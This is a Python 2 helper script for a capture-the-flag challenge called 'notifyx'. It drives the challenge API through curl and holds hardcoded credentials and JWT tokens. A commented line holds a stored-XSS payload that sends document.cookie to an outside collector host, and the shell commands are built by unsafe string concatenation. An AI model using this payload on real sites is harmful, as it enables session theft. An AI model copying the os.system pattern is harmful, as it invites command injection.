import os

mail = 'viroots@gmail.com'
password = 'viroots'

def create(mail, password):
    cmd = 'curl -X POST "https://notifyxapi.rootersctf.in/api/v1/register/" -H "Content-Type: application/json" -d \'{"email": \"' + mail + '\", "password": \"' + password + '\"}\' '
    os.system(cmd)

def login(mail, password):
    cmd = 'curl -X POST "https://notifyxapi.rootersctf.in/api/v1/login/" -H "Content-Type: application/json" -d \'{"email": \"' + mail + '\", "password": \"' + password + '\"}\' '
    os.system(cmd)

def watchNotification(jwt):
    cmd = 'curl -H "Authorization: Bearer ' + jwt + '" -H "Content-Type: application/json" "https://notifyxapi.rootersctf.in/api/v1/notifications/"'
    # cmd = 'curl -H "Authorization: Bearer ' + jwt + '" -H "Content-Type: application/json" "https://notifyxapi.rootersctf.in/cdn-cgi/l/email-protection"'
    os.system(cmd)

def createNotification(jwt, title='h0x', body='y0'):
    cmd = 'curl -H "Authorization: Bearer ' + jwt + '" -H "Content-Type: application/json" "https://notifyxapi.rootersctf.in/api/v1/notifications/" -d \'{"body": \"' + body + '\", "title": \"' + title + '\"}\''
    print cmd
    os.system(cmd)

# create(mail, password)
# login('test@test.com', 'password')

jwt = '.eJwdjDkOwzAMwP7iuYMl2zrymcDWgXZNmqno3xt0JAnwU64zjv3lZSuAXB5lzyPOZ9nexxU3_UubgJDVReqADkNxukfVUVdHFGs6uA3jABUImSxinWP4IEYByqDO3cCMlOiedPCZOduKtZzUhdURiObtghN7ArFRgnaLWsv3B3fFLnQ.XaBlbg.dkI2fUUVjJxvuOldl3FY2wFil98'
jt2 = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzA3NzgwNjksIm5iZiI6MTU3MDc3ODA2OSwianRpIjoiNGQ5YzBlOWUtMmM5MC00ZGJjLTk0YTctZTgyYjVmMDhiZjZjIiwiZXhwIjoxNjAyMzE0MDY5LCJpZGVudGl0eSI6MTI3LCJmcmVzaCI6ZmFsc2UsInR5cGUiOiJhY2Nlc3MifQ.fk0_gzKNG9O5FhcWK3NDQ8h2Fy4nvfYQOFdD-sTChaI'
jt3 = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzA3NzgxMTMsIm5iZiI6MTU3MDc3ODExMywianRpIjoiZjk3NDhiMTktNmMxNi00NWMwLWJjNTQtOGZlYjQ5M2Q0ZmI5IiwiZXhwIjoxNjAyMzE0MTEzLCJpZGVudGl0eSI6MTI3LCJmcmVzaCI6ZmFsc2UsInR5cGUiOiJhY2Nlc3MifQ.d_jhIKa4fI4EvQo-Bu2cqALzksnLidhuQoH7SKkVuCY'

# body = '<img src=\'https://enx88p5prg1f.x.pipedream.net?cookie="+document.cookie+"\'></img>'
# createNotification(jt3, title='abc', body=body)

# sleep(1)

watchNotification(jt2)
